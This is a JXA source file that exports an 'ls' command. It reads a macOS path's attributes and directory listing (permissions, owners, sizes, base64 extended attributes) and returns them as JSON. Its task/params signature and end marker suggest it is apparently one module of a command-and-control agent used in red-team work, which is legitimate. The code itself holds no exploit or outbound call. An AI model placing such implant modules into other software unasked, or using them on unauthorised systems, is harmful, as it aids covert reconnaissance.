exports.ls = function(task, command, params){
    ObjC.import('Foundation');
    try {
        let command_params = JSON.parse(params);
        let fileManager = $.NSFileManager.defaultManager;
        let error = Ref();
        let path = command_params['path'];
        if (path === "" || path === undefined) {
            path = fileManager.currentDirectoryPath.js;
            if (path === undefined || path === "") {
                return {
                    "user_output": "Failed to get current working directory",
                    "completed": true,
                    "status": "error"
                };
            }
        }
        if (path[0] === '"') {
            path = path.substring(1, path.length - 1);
        }
        if(path[0] === '~'){
            path = $(path).stringByExpandingTildeInPath.js;
        }
        let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path), error));
        if (attributes !== undefined) {
            attributes['type'] = "F";
            attributes['files'] = [];
            if (attributes.hasOwnProperty('NSFileType') && attributes['NSFileType'] === "NSFileTypeDirectory") {
                let error = Ref();
                attributes['type'] = "D";
                let files = ObjC.deepUnwrap(fileManager.contentsOfDirectoryAtPathError($(path), error));
                if (files !== undefined) {
                    let files_data = [];
                    let sub_files = files;
                    if (path[path.length - 1] !== "/") {
                        path = path + "/";
                    }
                    for (let i = 0; i < sub_files.length; i++) {
                        let attr = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        let file_add = {};
                        file_add['name'] = sub_files[i];
                        if (attr['NSFileType'] === "NSFileTypeDirectory") {
                            file_add['type'] = "D";
                        } else {
                            file_add['type'] = "";
                        }
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), $()));
                        if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                            let extended = {};
                            let perms = plistPerms['NSFileExtendedAttributes'].js;
                            for(let j in perms){
                                extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                            }
                            file_add['ExtendedAttributes'] = extended;
                        }
                        file_add['size'] = attr['NSFileSize'];
                        let nsposix = attr['NSFilePosixPermissions'];
                        // we need to fix this mess to actually be real permission bits that make sense
                        file_add['permissions'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                        file_add['owner'] = attr['NSFileOwnerAccountName'] + "(" + attr['NSFileOwnerAccountID'] + ")";
                        file_add['group'] = attr['NSFileGroupOwnerAccountName'] + "(" + attr['NSFileGroupOwnerAccountID'] + ")";
                        if (attr['NSFileExtensionHidden']) {
                            file_add['hidden'] = "Y";
                        } else {
                            file_add['hidden'] = "";
                        }
                        files_data.push(file_add);
                    }
                    attributes['files'] = files_data;
                }else{

                }
            }
            delete attributes['NSFileSystemFileNumber'];
            delete attributes['NSFileSystemNumber'];
            delete attributes['NSFileType'];
            let nsposix = attributes['NSFilePosixPermissions'];
            // we need to fix this mess to actually be real permission bits that make sense
            delete attributes['NSFilePosixPermissions'];
            attributes['name'] = path;
            attributes['size'] = attributes['NSFileSize'];
            attributes['permissions'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();;
            attributes['owner'] = attributes['NSFileOwnerAccountName'] + "(" + attributes['NSFileOwnerAccountID'] + ")";
            attributes['group'] = attributes['NSFileGroupOwnerAccountName'] + "(" + attributes['NSFileGroupOwnerAccountID'] + ")";
            if (attributes['NSFileExtensionHidden']) {
                attributes['hidden'] = "Y";
            } else {
                attributes['hidden'] = "";
            }
            delete attributes['NSFileSize'];
            delete attributes['NSFileOwnerAccountName'];
            delete attributes['NSFileOwnerAccountID'];
            delete attributes['NSFileGroupOwnerAccountName'];
            delete attributes['NSFileGroupOwnerAccountID'];
            return {"user_output": JSON.stringify(attributes, null, 6), "completed": true};
        }else{
            return {
                "user_output": "Failed to get attributes of file. File doesn't exist or you don't have permission to read it",
                "completed": true,
                "status": "error"
            };
        }

    }catch(error){
        return {
            "user_output": "Error: " + error.toString(),
            "completed": true,
            "status": "error"
        };
    }
};
COMMAND_ENDS_HERE